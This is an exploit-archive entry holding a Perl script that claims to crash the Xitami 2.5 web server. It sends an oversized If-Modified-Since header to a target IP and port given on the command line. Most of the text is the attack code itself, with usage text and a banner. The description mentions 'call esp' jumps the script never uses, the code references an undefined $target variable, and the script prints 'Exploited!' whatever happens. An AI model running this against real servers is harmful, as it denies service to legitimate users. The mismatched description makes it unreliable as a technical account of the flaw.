id: 39243
date: 01/15/2024
title: Xitami 2.5 Denial Of Service Exploit
author: Fernando Mengali
cves: 

#!/usr/bin/perl

use IO::Socket::INET;

# Exploit Title: Xitami 2.5 - Denial of Service (DoS)
# Discovery by: Fernando Mengali
# Discovery Date: 14 january 2024
# Vendor Homepage: https://imatix-legacy.github.io/xitami.com/
# Download to demo: https://drive.google.com/file/d/1Uw9fCQ9T3IBqn53pS2lETUCM6zzYDSb8/view?usp=sharing
# Notification vendor: No reported
# Tested Version: Xitami 2.5 
# Tested on: Window XP Professional - Service Pack 2 and 3 - English
# Vulnerability Type: Denial of Service (DoS)
# VÃ­deo: https://www.youtube.com/watch?v=tutFcL3Gh8I

#1. Description

#His technique works fine against Windows XP Professional Service Pack 2 and 3 (English).
#For this exploit I have tried several strategies to increase reliability and performance:
#Jump to a static 'call esp'
#Backwards jump to code a known distance from the stack pointer.
#The server did not properly handle request with large amounts of data to webserver.
#The following request sends a large amount of data to the webserver to process, the server will crash as soon as it is received and processed, causing denial of service conditions.
#Successful exploitation of these issues allows remote attackers to crash the affected server, denying service to legitimate users.

#2. Proof of Concept - PoC

    $sis="$^O";

    if ($sis eq "windows"){
      $cmd="cls";
    } else {
      $cmd="clear";
    }

    system("$cmd");
    
    intro();
    main();

print "\t    ==> Connecting to webserver... \n\n";
sleep(1);

    $exploit  = "A"*939;

if ($socket = IO::Socket::INET->new
   (PeerAddr => $ip,
   PeerPort => $port, 
   Proto => "TCP"))
   
    { 
    $header =
    "GET / HTTP/1.1\r\n".
    "Host: ".$target." \r\n".
    "If-Modified-Since: AAAAAAAAAAAAA "." $exploit\r\n";

    print $socket $header."\r\n";
    sleep(1);
    close($socket);
    }

else
  {
  print "[-] Connection to $target failed!\n";
  } 
            


print "\t    ==> Done! Exploited!";
   sub intro {
      print q {


     _________
    |         |
    | Exploit |==( )    //////
    |_________|   |||   | o o|                 
                    ||| ( c  )                  ____
                     ||| \= /                  ||   \_
                      ||||||                   ||     |
                      ||||||                ...||__/|-"
                      ||||||             __|________|__
                        |||             |______________|
                        |||             || ||      || ||
                        |||             || ||      || ||
      ------------|||-------------||-||------||-||-------
                        |__>            || ||      || ||          
                        
      [+] Xitami 2.5 - Denial of Service (DoS)

      [*] Coded by Fernando Mengali

      [@] e-mail: fernando.mengalli@gmail.com

      }
  }

  sub main {

our ($ip, $port) = @ARGV;

      unless (defined($ip) && defined($port)) {

        print "\n\tUsage: $0 <ip> <port>                 \n";
        exit(-1);

      }
  }

#  0day.today [2024-01-19]  #